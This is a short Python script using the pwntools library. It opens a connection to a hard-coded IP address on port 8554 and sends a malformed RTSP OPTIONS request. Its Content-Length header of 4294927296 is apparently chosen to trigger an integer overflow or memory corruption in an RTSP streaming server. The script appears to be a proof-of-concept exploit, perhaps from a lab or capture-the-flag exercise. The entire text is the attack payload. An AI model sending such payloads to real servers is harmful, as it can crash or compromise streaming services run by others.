from pwn import *

conn = remote("140.113.209.12", 8554)

pl = "OPTIONS rtsp://10.113.214.93:8554/a.mkv RTSP/1.0\r\nCSeq: 1 \r\nUser-Agent: Lavf55.37.102\r\n"
pl += "Content-Length: 4294927296\r\n\r\n"
conn.send(pl)
